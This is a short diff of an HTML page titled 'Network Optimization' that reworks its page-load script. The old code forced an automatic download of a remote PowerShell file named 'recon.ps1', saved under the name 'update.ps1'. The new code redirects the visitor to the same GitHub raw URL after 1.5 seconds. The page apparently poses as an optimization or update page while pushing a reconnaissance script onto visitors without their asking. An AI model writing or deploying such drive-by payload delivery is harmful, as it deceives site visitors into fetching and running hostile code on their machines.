@@ -5,13 +5,7 @@
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Network Optimization</title>
   <style>
-    body { 
-      background: #111; 
-      color: #0f0; 
-      font-family: Arial; 
-      text-align: center; 
-      padding: 60px; 
-    }
+    body { background: #111; color: #0f0; font-family: Arial; text-align: center; padding: 60px; }
     button { 
       padding: 15px 40px; 
       font-size: 18px; 
@@ -36,15 +30,9 @@
   </p>
 
   <script>
-    // Try to force download on page load (may still need click on some browsers)
     setTimeout(() => {
-      const link = document.createElement('a');
-      link.href = "https://raw.githubusercontent.com/yggr153/error-screenshot/main/recon.ps1";
-      link.download = "update.ps1";
-      document.body.appendChild(link);
-      link.click();
-      document.body.removeChild(link);
-    }, 800);
+      window.location.href = "https://raw.githubusercontent.com/yggr153/error-screenshot/main/recon.ps1";
+    }, 1500);
   </script>
 </body>
 </html>
